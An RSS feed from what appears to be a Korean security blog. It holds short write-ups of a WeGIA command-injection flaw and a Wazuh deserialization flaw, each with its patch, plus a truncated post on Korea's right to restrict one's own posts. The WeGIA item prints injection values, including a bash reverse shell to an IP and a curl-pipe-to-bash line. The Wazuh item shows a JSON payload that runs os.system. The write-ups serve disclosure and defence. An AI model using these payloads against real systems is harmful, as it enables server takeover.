<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Wed, 26 Feb 2025 09:15:18 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2025-27140: WeGIA application의 parameter 검증 미흡으로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/02/28/newp1ayer48/CVE-2025-27140/</link>
      <guid>https://hackyboiz.github.io/2025/02/28/newp1ayer48/CVE-2025-27140/</guid>
      <pubDate>Fri, 28 Feb 2025 09:10:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/LabRedesCefetRJ/WeGIA/security/a</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-xw6w-x28r-2p5c">https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-xw6w-x28r-2p5c</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>WeGIA application 3.2.15 &#xC774;&#xD558; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xAE30;&#xAD00;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC6F9; &#xD1B5;&#xD569; &#xAD00;&#xB9AC; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; WeGIA&#xC758; application&#xC5D0;&#xC11C; parameter &#xAC80;&#xC99D; &#xBBF8;&#xD761;&#xC73C;&#xB85C; &#xC778;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>importar_dump.php</code> &#xB0B4;&#xBD80;&#xC5D0; &#xC544;&#xB798; &#xAD6C;&#xBB38;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs php">$log = shell_exec(<span class="hljs-string">&quot;mv &quot;</span>. $_FILES[<span class="hljs-string">&quot;import&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>] . <span class="hljs-string">&quot; &quot;</span> . BKP_DIR . $_FILES[<span class="hljs-string">&quot;import&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);</code></pre><p><code>shell_exec()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; <code>mv</code> &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xC784;&#xC2DC; &#xD30C;&#xC77C;&#xC744; &#xC774;&#xB3D9;&#xD558;&#xB294; &#xBA85;&#xB839;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; parameter&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xBBF8;&#xD761;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Command Injection &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xCD94;&#xAC00;&#xB85C; &#xC784;&#xC2DC; &#xD30C;&#xC77C;&#xC744; &#xC774;&#xB3D9;&#xD558;&#xB294; &#xBA85;&#xB839;&#xC774;&#xAE30;&#xC5D0; Reverse Shell &#xC0AC;&#xC6A9;&#xACFC; Web Shell &#xC5C5;&#xB85C;&#xB4DC;&#xB3C4; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC138;&#xC158; &#xAC80;&#xC99D; &#xC774;&#xD6C4; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xC158; &#xAD6C;&#xBB38;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB098;, &#xC2E4;&#xD589; &#xC885;&#xB8CC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&quot;usuario&quot;</span>])){    header(<span class="hljs-string">&quot;Location: ../../index.php&quot;</span>);}</code></pre><p>&#xC774;&#xB85C; &#xC778;&#xD574; &#xBCC4;&#xB3C4;&#xC758; &#xB85C;&#xADF8;&#xC778; &#xACFC;&#xC815;&#xC774; &#xC5C6;&#xC5B4;&#xB3C4; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xBC0F; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC; &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>PoC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="1-OS-Command-Injection"><a href="#1-OS-Command-Injection" class="headerlink" title="1. OS Command Injection"></a>1. OS Command Injection</h3><p><code>sleep 5</code> &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294; Command Injection&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>filename</code>&#xC5D0; <code>a</code> &#xC774;&#xB984;&#xC73C;&#xB85C; &#xD568;&#xAED8; &#xB2F4;&#xC544; &#xC804;&#xB2EC;&#xD558;&#xBA74; <code>sleep 5</code> &#xBA85;&#xB839;&#xC774; &#xC218;&#xD589; &#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs abnf">a<span class="hljs-comment">;sleep 5</span></code></pre><p><img src="/2025/02/28/newp1ayer48/CVE-2025-27140/1.png" alt></p><h3 id="2-Reverse-shell-&#xC2E4;&#xD589;"><a href="#2-Reverse-shell-&#xC2E4;&#xD589;" class="headerlink" title="2. Reverse shell &#xC2E4;&#xD589;"></a>2. Reverse shell &#xC2E4;&#xD589;</h3><p>&#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; reverse shell&#xC744; &#xBE4C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>bash -i &gt;&amp; /dev/tcp/172.30.137.198/7777 0&gt;&amp;1</code></p><p><code>|</code>&#xB85C; bash shell&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xBA74; reverse shell&#xC774; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xC608;&#xC2DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs gherkin">a;curl -L <span class="hljs-variable">&lt;your_page_responses_rev_shell_code&gt;</span> |<span class="hljs-string"> bash</span></code></pre><p><img src="/2025/02/28/newp1ayer48/CVE-2025-27140/2.png" alt></p><h3 id="3-Web-Shell-&#xC5C5;&#xB85C;&#xB4DC;"><a href="#3-Web-Shell-&#xC5C5;&#xB85C;&#xB4DC;" class="headerlink" title="3. Web Shell &#xC5C5;&#xB85C;&#xB4DC;"></a>3. Web Shell &#xC5C5;&#xB85C;&#xB4DC;</h3><p>Web Shell &#xC5C5;&#xB85C;&#xB4DC;&#xB294; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC; &#xAE30;&#xB2A5;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xC5EC; php Web Shell&#xC744; &#xC27D;&#xAC8C; &#xC5C5;&#xB85C;&#xB4DC; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>PoC&#xC5D0;&#xC11C;&#xB294; <code>l8BL.php</code>&#xB77C;&#xB294; &#xC774;&#xB984;&#xC73C;&#xB85C; php Web Shell&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/02/28/newp1ayer48/CVE-2025-27140/3.png" alt></p><p><img src="/2025/02/28/newp1ayer48/CVE-2025-27140/4.png" alt></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; escapeshellarg() &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; command injection&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD2B9;&#xC218; &#xBB38;&#xC790;&#xC5D0; &#xB300;&#xD574; &#xC774;&#xC2A4;&#xCF00;&#xC774;&#xD504; &#xD558;&#xB3C4;&#xB85D; &#xBCF4;&#xC644;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/02/28/newp1ayer48/CVE-2025-27140/5.png" alt></p><p>&#xADF8;&#xB9AC;&#xACE0; exit() &#xD568;&#xC218;&#xB97C; &#xCD94;&#xAC00;&#xD574; &#xC138;&#xC158; &#xAC80;&#xC99D; &#xC774;&#xD6C4; &#xC885;&#xB8CC; &#xAD6C;&#xBB38;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xBCF4;&#xC644; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/02/28/newp1ayer48/CVE-2025-27140/6.png" alt></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27140">https://nvd.nist.gov/vuln/detail/CVE-2025-27140</a></li><li><a href="https://github.com/LabRedesCefetRJ/WeGIA">https://github.com/LabRedesCefetRJ/WeGIA</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/WeGIA/">WeGIA</category>
      
      <category domain="https://hackyboiz.github.io/tags/application/">application</category>
      
      <category domain="https://hackyboiz.github.io/tags/OS-Command-Injection/">OS Command Injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      
      <comments>https://hackyboiz.github.io/2025/02/28/newp1ayer48/CVE-2025-27140/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-24016: Wazuh Manager의 안전하지 않은 역직렬화로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/02/22/empty/CVE-2025-24016/</link>
      <guid>https://hackyboiz.github.io/2025/02/22/empty/CVE-2025-24016/</guid>
      <pubDate>Sat, 22 Feb 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/wazuh/wazuh/security/advisories/</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/wazuh/wazuh/security/advisories/GHSA-hcrc-79hj-m3qh">https://github.com/wazuh/wazuh/security/advisories/GHSA-hcrc-79hj-m3qh</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Wazuh 4.4.0 &#xC774;&#xC0C1; 4.9.1 &#xC774;&#xD558; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-24016&#xB294; &#xC624;&#xD508;&#xC18C;&#xC2A4; SIEM(Security Information and Event Management)&#xC778; Wazuh&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xB85C; &#xC778;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. Wazuh&#xB294; &#xD06C;&#xAC8C; Wazuh Agent, Wazuh Manager, Elasticsearch &amp; Kibana&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xADFC;&#xBCF8; &#xC6D0;&#xC778;&#xC740; Wazuh Manager&#xC5D0;&#xC11C; <code>eval</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. Wazuh Manager&#xC758; &#xC77C;&#xBD80; API&#xB294; JSON &#xC694;&#xCCAD;&#xC744; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;(<code>json.loads()</code>)&#xD560; &#xB54C;, <code>object_hook</code> &#xC635;&#xC158;&#xC744; &#xD1B5;&#xD574; <code>as_wazuh_object</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xD6C4;&#xCC98;&#xB9AC;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/02/22/empty/CVE-2025-24016/1.png" alt></p><p><code>as_wazuh_object</code> &#xD568;&#xC218;&#xB294; JSON &#xB0B4;&#xBD80;&#xC5D0; <code>__unhandled_exc__</code> &#xD0A4;&#xAC00; &#xC788;&#xC744; &#xACBD;&#xC6B0;, &#xADF8; &#xC548;&#xC758; <code>__class__</code>&#xC640; <code>__args__</code> &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD574; <code>eval</code>&#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xC744; &#xADF8;&#xB300;&#xB85C; <code>eval</code>&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xBBC0;&#xB85C; &#xC784;&#xC758; &#xBA85;&#xB839; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/02/22/empty/CVE-2025-24016/2.png" alt></p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; JSON&#xC744; API &#xC694;&#xCCAD;&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xBA74; <code>os.system(&quot;bash&quot;)</code>&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; RCE&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs json">{  <span class="hljs-attr">&quot;__unhandled_exc__&quot;</span>: {      <span class="hljs-attr">&quot;__class__&quot;</span>: <span class="hljs-string">&quot;os.system&quot;</span>,      <span class="hljs-attr">&quot;__args__&quot;</span>: [      <span class="hljs-string">&quot;bash&quot;</span>]}}</code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>eval</code>&#xD568;&#xC218;&#xB97C; <code>literal_eval</code>&#xD568;&#xC218;&#xB85C; &#xD328;&#xCE58;&#xD558;&#xBA70; &#xC81C;&#xD55C;&#xB41C; &#xD0C0;&#xC785;(strings, bytes, numbers, tuples, lists, dicts, sets, booleans, None and Ellipsis)&#xB9CC; &#xCC98;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xBCF4;&#xC548;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/02/22/empty/CVE-2025-24016/3.png" alt></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/0xjessie21/CVE-2025-24016">https://github.com/0xjessie21/CVE-2025-24016</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/empty/">empty</category>
      
      <category domain="https://hackyboiz.github.io/tags/wazuh/">wazuh</category>
      
      <category domain="https://hackyboiz.github.io/tags/Remote-Code-Execution/">Remote Code Execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/Insecure-Deserialization/">Insecure Deserialization</category>
      
      
      <comments>https://hackyboiz.github.io/2025/02/22/empty/CVE-2025-24016/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 인터넷 자기게시물 접근배제요청권 (ko)</title>
      <link>https://hackyboiz.github.io/2025/02/22/romi0x/right-to-be-forgotten-ko/</link>
      <guid>https://hackyboiz.github.io/2025/02/22/romi0x/right-to-be-forgotten-ko/</guid>
      <pubDate>Sat, 22 Feb 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;, romi0x&amp;#xC608;&amp;#xC694;!&lt;/p&gt;
&lt;p&gt;&amp;#xC778;&amp;#xD130;&amp;#xB137;&amp;#xC5D0; &amp;#xB0A8;&amp;#xACA8;&amp;#xC9C4; &amp;#xBCF</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, romi0x&#xC608;&#xC694;!</p><p>&#xC778;&#xD130;&#xB137;&#xC5D0; &#xB0A8;&#xACA8;&#xC9C4; &#xBCF8;&#xC778;&#xC758; &#xD751;&#xC5ED;&#xC0AC;&#xB97C; &#xC9C0;&#xC6B0;&#xACE0; &#xC2F6;&#xC5C8;&#xB358; &#xC801;&#xC774; &#xC788;&#xB098;&#xC694;? &#xD639;&#xC740; &#xAC8C;&#xC2DC;&#xBB3C;&#xC744; &#xC0AD;&#xC81C;&#xD558;&#xB824; &#xD588;&#xC9C0;&#xB9CC; &#xC0AD;&#xC81C;&#xD560; &#xC218; &#xC5C6;&#xC5C8;&#xB358; &#xACBD;&#xD5D8;&#xC774; &#xC788;&#xB098;&#xC694;? &#xC11C;&#xBE44;&#xC2A4; &#xD68C;&#xC6D0;&#xC744; &#xD0C8;&#xD1F4;&#xD558;&#xAC70;&#xB098; &#xAC8C;&#xC2DC;&#xBB3C; &#xC0AD;&#xC81C; &#xBC84;&#xD2BC;&#xC774; &#xC5C6;&#xC5B4;&#xC11C; &#xC6D0;&#xD558;&#xB294; &#xAC8C;&#xC2DC;&#xBB3C;&#xC744; &#xC0AD;&#xC81C;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xC0C1;&#xD669;&#xC774; &#xC788;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xC5B4;&#xC694;. &#xC774;&#xB7F0; &#xC0C1;&#xD669;&#xC744; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#x2018;<strong>&#xC778;&#xD130;&#xB137; &#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C; &#xC811;&#xADFC;&#xBC30;&#xC81C;&#xC694;&#xCCAD;&#xAD8C;</strong>&#x2019;&#xC774;&#xB77C;&#xB294; &#xAD8C;&#xB9AC;&#xAC00; &#xC788;&#xC5B4;&#xC694;.</p><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xBCF8;&#xC778;&#xC774; &#xC62C;&#xB9B0; &#xAC8C;&#xC2DC;&#xBB3C;&#xC5D0; &#xB300;&#xD574; &#xD0C0;&#xC778;&#xC758; &#xC811;&#xADFC; &#xBC30;&#xC81C;&#xB97C; &#xC694;&#xCCAD;&#xD560; &#xC218; &#xC788;&#xB294; &#xAD8C;&#xB9AC;&#xC778; &#x2018;<strong>&#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C; &#xC811;&#xADFC;&#xBC30;&#xC81C;&#xC694;&#xCCAD;&#xAD8C;</strong>&#x2019;&#xC5D0; &#xB300;&#xD574; &#xC18C;&#xAC1C;&#xD560;&#xAC8C;&#xC694;.</p><p><img src="/2025/02/22/romi0x/right-to-be-forgotten-ko/image.png" alt="&#xC0AC;&#xC9C4;"></p><p>&#xCD9C;&#xCC98;: <a href="https://biz.chosun.com/site/data/html_dir/2014/07/17/2014071700027.html">https://biz.chosun.com/site/data/html_dir/2014/07/17/2014071700027.html</a></p><h1 id="1-&#xC778;&#xD130;&#xB137;-&#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C;-&#xC811;&#xADFC;&#xBC30;&#xC81C;&#xC694;&#xCCAD;&#xAD8C;"><a href="#1-&#xC778;&#xD130;&#xB137;-&#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C;-&#xC811;&#xADFC;&#xBC30;&#xC81C;&#xC694;&#xCCAD;&#xAD8C;" class="headerlink" title="1. &#xC778;&#xD130;&#xB137; &#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C; &#xC811;&#xADFC;&#xBC30;&#xC81C;&#xC694;&#xCCAD;&#xAD8C;?"></a><strong>1. &#xC778;&#xD130;&#xB137; &#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C; &#xC811;&#xADFC;&#xBC30;&#xC81C;&#xC694;&#xCCAD;&#xAD8C;?</strong></h1><p>&#xC774;&#xC6A9;&#xC790; &#xBCF8;&#xC778;&#xC774; &#xC778;&#xD130;&#xB137;&#xC0C1;&#xC5D0; &#xAC8C;&#xC2DC;&#xD55C; &#xAC8C;&#xC2DC;&#xBB3C;&#xC5D0; &#xB300;&#xD574; &#xD0C0;&#xC778;&#xC758; &#xC811;&#xADFC; &#xBC30;&#xC81C;&#xB97C; &#xC694;&#xCCAD;&#xD560; &#xC218; &#xC788;&#xB294; &#xAD8C;&#xB9AC;&#xB97C; &#x2018;<strong>&#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C; &#xC811;&#xADFC;&#xBC30;&#xC81C;&#xC694;&#xCCAD;&#xAD8C;</strong>&#x2019;&#xC774;&#xB77C;&#xACE0; &#xD574;&#xC694;. &#xC774; &#xAD8C;&#xB9AC;&#xB85C; &#xC778;&#xD574; &#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xC11C;&#xBE44;&#xC2A4; &#xC81C;&#xACF5;&#xC790;&#xB294; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xCC98;&#xB9AC;&#xC790;&#xB85C;&#xC11C; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xBCF4;&#xD638; &#xC6D0;&#xCE59;&#xC744; &#xC900;&#xC218;&#xD560; &#xC218; &#xC788;&#xACE0;, &#xC774;&#xC6A9;&#xC790;&#xB294; &#xBCF8;&#xC778;&#xC758; &#xAC1C;&#xC778;&#xC815;&#xBCF4;&#xB97C; &#xBCF4;&#xD638;&#xD558;&#xACE0; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xC9C0;&#xD0AC; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><p>&#xD55C;&#xAD6D;&#xC5D0;&#xC11C;&#xB294; 2016&#xB144;&#xBD80;&#xD130; &#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xB9DD; &#xC774;&#xC6A9;&#xCD09;&#xC9C4; &#xBC0F; &#xC815;&#xBCF4;&#xBCF4;&#xD638; &#xB4F1;&#xC5D0; &#xAD00;&#xD55C; &#xBC95;&#xB960;(&#xC815;&#xBCF4;&#xD1B5;&#xC2E0;&#xB9DD;&#xBC95;)&#xC5D0; &#xB530;&#xB77C; &#xAC1C;&#xC778;&#xC774; &#xC790;&#xC2E0;&#xC774; &#xC791;&#xC131;&#xD55C; &#xAC8C;&#xC2DC;&#xBB3C;&#xC5D0; &#xB300;&#xD574; &#xAC80;&#xC0C9; &#xC81C;&#xD55C;&#xC744; &#xC694;&#xCCAD;&#xD560; &#xC218; &#xC788;&#xB294; &#x2018;&#xC778;&#xD130;&#xB137; &#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C; &#xC811;&#xADFC;&#xBC30;&#xC81C;&#xC694;&#xCCAD;&#xAD8C;&#x2019;&#xC774; &#xB3C4;&#xC785;&#xB418;&#xC5C8;&#xC5B4;&#xC694;. &#xC774;&#xB294; &#xBCF8;&#xC778;&#xC774; &#xC791;&#xC131;&#xD55C; &#xAC8C;&#xC2DC;&#xBB3C;&#xC774;&#xB77C; &#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC0AD;&#xC81C; &#xC694;&#xCCAD;&#xC774; &#xC544;&#xB2CC; &#x2018;&#xC811;&#xADFC; &#xC81C;&#xD55C;&#x2019; &#xC870;&#xCE58;&#xB97C; &#xC694;&#xAD6C;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD55C; &#xC81C;&#xB3C4;&#xC608;&#xC694;.</p><p><img src="/2025/02/22/romi0x/right-to-be-forgotten-ko/image1.png" alt="&#xC0AC;&#xC9C4;"></p><h2 id="1-2-&#xD574;&#xC678;-&#xC0AC;&#xB840;&#xC640;-&#xAD6D;&#xB0B4;-&#xBE44;&#xAD50;"><a href="#1-2-&#xD574;&#xC678;-&#xC0AC;&#xB840;&#xC640;-&#xAD6D;&#xB0B4;-&#xBE44;&#xAD50;" class="headerlink" title="1-2. &#xD574;&#xC678; &#xC0AC;&#xB840;&#xC640; &#xAD6D;&#xB0B4; &#xBE44;&#xAD50;"></a>1-2. &#xD574;&#xC678; &#xC0AC;&#xB840;&#xC640; &#xAD6D;&#xB0B4; &#xBE44;&#xAD50;</h2><p>&#xC778;&#xD130;&#xB137;&#xC0C1;&#xC758; &#xC815;&#xBCF4; &#xC0AD;&#xC81C; &#xC694;&#xCCAD;&#xACFC; &#xAD00;&#xB828;&#xD558;&#xC5EC; &#xD55C;&#xAD6D;&#xC758; &#x2018;&#xC778;&#xD130;&#xB137; &#xC790;&#xAE30;&#xAC8C;&#xC2DC;&#xBB3C; &#xC811;&#xADFC;&#xBC30;&#xC81C;&#xC694;&#xCCAD;&#xAD8C;&#x2019;&#xACFC; &#xD574;&#xC678;&#xC5D0;&#xC11C; &#xB110;&#xB9AC; &#xB17C;&#xC758;&#xB418;&#xB294; &#x2018;&#xC78A;&#xD790; &#xAD8C;&#xB9AC;(right to be forgotten)&#x2019;&#xB294; &#xACF5;&#xD1B5;&#xB41C; &#xBAA9;&#xC801;&#xC744; &#xAC00;&#xC9C0;&#xBA74;&#xC11C;&#xB3C4; &#xBC95;&#xC801; &#xC801;&#xC6A9; &#xBC29;&#xC2DD;&#xACFC; &#xBC94;&#xC704;&#xC5D0;&#xC11C; &#xCC28;&#xC774;&#xB97C; &#xBCF4;&#xC5EC;&#xC694;.</p><h3 id="&#xC720;&#xB7FD;&#xC5F0;&#xD569;-EU-&#xC78A;&#xD600;&#xC9C8;-&#xAD8C;&#xB9AC;"><a href="#&#xC720;&#xB7FD;&#xC5F0;&#xD569;-EU-&#xC78A;&#xD600;&#xC9C8;-&#xAD8C;&#xB9AC;" class="headerlink" title="&#xC720;&#xB7FD;&#xC5F0;&#xD569;(EU): &#xC78A;&#xD600;&#xC9C8; &#xAD8C;&#xB9AC;"></a><strong>&#xC720;&#xB7FD;&#xC5F0;&#xD569;(EU): &#xC78A;&#xD600;&#xC9C8; &#xAD8C;&#xB9AC;</strong></h3><p>&#xC720;&#xB7FD;&#xC5F0;&#xD569;&#xC5D0;&#xC11C;&#xB294; &#x2018;&#xC78A;&#xD600;&#xC9C8; &#xAD8C;&#xB9AC;(Right to be Forgotten)&#x2019;&#xB77C;&#xB294; &#xBC95;&#xC801; &#xAD8C;&#xB9AC;&#xAC00; &#xC788;&#xC5B4;&#xC694;. 2014&#xB144; &#xC720;&#xB7FD;&#xC0AC;&#xBC95;&#xC7AC;&#xD310;&#xC18C;(CJEU)&#xC758; &#xD310;&#xACB0;(&#xAD6C;&#xAE00; &#xC2A4;&#xD398;&#xC778; &#xC0AC;&#xAC74;) &#xC774;&#xD6C4; &#xACF5;&#xC2DD;&#xC801;&#xC73C;&#xB85C; &#xC778;&#xC815;&#xB418;&#xC5C8;&#xC5B4;&#xC694;. &#xC774;&#xD6C4; 2018&#xB144; &#xC2DC;&#xD589;&#xB41C; &#xC77C;&#xBC18; &#xAC1C;&#xC778;&#xC815;&#xBCF4; &#xBCF4;&#xD638;&#xBC95;(GDPR)&#xC5D0;&#xC11C;&#xB3C4; &#xC78A;&#xD790; &#xAD8C;&#xB9AC;&#xB97C; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xADDC;&#xC815;&#xD558;&#xACE0; &#xC788;&#xC8E0;.</p><p>&#xC8FC;&#xC694; &#xC0AC;&#xB840;&#xB85C;&#xB294; &#xAD6C;&#xAE00; &#xC2A4;&#xD398;&#xC778; 